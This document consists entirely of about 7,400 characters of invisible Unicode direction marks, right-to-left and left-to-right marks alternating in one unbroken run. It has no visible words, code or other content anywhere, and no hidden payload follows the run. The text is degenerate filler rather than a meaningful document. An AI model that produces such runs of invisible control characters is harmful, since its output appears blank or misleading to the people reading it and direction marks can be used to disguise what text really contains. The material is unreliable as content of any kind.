‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎
